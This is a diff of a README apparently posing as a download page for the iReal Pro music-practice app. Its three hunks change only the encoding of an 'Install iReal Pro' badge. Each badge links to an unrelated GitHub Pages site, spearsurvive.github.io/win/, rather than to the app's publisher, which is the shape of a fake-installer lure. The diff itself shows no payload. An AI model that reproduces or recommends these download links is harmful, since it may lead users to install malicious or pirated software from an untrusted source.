@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ iReal Pro is a popular practice tool for musicians that displays chord charts an
 
 <div align="center">
 
-[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ iReal Pro is a popular practice tool for musicians that displays chord charts an
 
 <div align="center">
 
-[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install iReal Pro](https://img.shields.io/badge/⬇_Install_iReal+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
